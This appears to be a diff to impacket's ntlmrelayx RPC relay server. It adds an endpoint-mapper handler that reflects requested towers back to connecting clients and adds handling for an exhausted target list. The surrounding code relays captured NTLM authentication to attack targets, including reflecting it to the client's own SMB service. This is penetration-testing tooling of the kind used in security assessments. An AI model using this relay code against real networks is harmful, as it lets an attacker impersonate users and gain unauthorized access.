@@ -16,6 +16,7 @@
 
 import socketserver
 import struct
+from impacket.dcerpc.v5.epm import *
 from impacket.dcerpc.v5.rpcrt import *
 from impacket.dcerpc.v5.dcomrt import *
 from impacket.ntlm import NTLMSSP_AUTH_NEGOTIATE, NTLMSSP_AUTH_CHALLENGE_RESPONSE, NTLMSSP_AUTH_CHALLENGE
@@ -54,12 +55,42 @@ class RPCRelayServer(Thread):
             }
             self.transport.addCallbacks(bin_to_uuidtup(IID_IObjectExporter), "135", IObjectExporterCallBacks)
 
+            IEPMCallBacks = {
+                3: self.handle_epmap
+            }
+            self.transport.addCallbacks(bin_to_uuidtup(MSRPC_UUID_PORTMAP), "135", IEPMCallBacks)
+
             if self.server.config.target is None:
                 # Reflection mode, defaults to SMB at the target, for now
                 self.server.config.target = TargetsProcessor(singleTarget='SMB://%s:445/' % self.clientAddress[0])
             self.target = self.server.config.target.getTarget()
-            LOG.info("RPCD: Received connection from %s, attacking target %s://%s" % (
-                self.client_address[0], self.target.scheme, self.target.netloc))
+            if self.target is None:
+                LOG.info("No target left")
+            else:
+                LOG.info("RPCD: Received connection from %s, attacking target %s://%s" % (
+                    self.client_address[0], self.target.scheme, self.target.netloc))
+
+        def handle_epmap(self, data):
+            request = ept_map(data)
+
+            resp = ept_mapResponse()
+            tow_arr = twr_p_t_array()
+            resp['status'] = 0
+            resp['num_towers'] = 1
+            req_handle = ept_lookup_handle_t()
+            req_handle['context_handle_attributes'] = 0
+            req_handle['context_handle_uuid'] = b'\00'*20
+            resp['entry_handle'] = req_handle
+            resp_tower = b''.join(request['map_tower']['tower_octet_string']) # just reflect the tower back
+
+            resp_tower_p = twr_p_t()
+            resp_tower_p['tower_length'] = len(resp_tower)
+            resp_tower_p['tower_octet_string'] = resp_tower
+            resp_tower_p['ReferentID'] = 3
+            tow_arr['Data'].append(resp_tower_p)
+            tow_arr['MaximumCount'] = request['max_towers']
+            resp['ITowers'] = tow_arr
+            return resp
 
         def send_ServerAlive2Response(self, request):
             response = ServerAlive2Response()
@@ -170,9 +201,12 @@ class RPCRelayServer(Thread):
                     return self.bind(self.challengeMessage)
                 except Exception as e:
                     # Connection failed
-                    LOG.error('Negotiating NTLM with %s://%s failed. Skipping to next target',
-                              self.target.scheme, self.target.netloc)
-                    self.server.config.target.logTarget(self.target)
+                    if self.target is None:
+                        LOG.error('Negotiating NTLM failed, and no target left')
+                    else:
+                        LOG.error('Negotiating NTLM with %s://%s failed. Skipping to next target',
+                                  self.target.scheme, self.target.netloc)
+                        self.server.config.target.logTarget(self.target)
                     return self.send_error(MSRPC_STATUS_CODE_RPC_S_ACCESS_DENIED)
 
             elif messageType == NTLMSSP_AUTH_CHALLENGE:
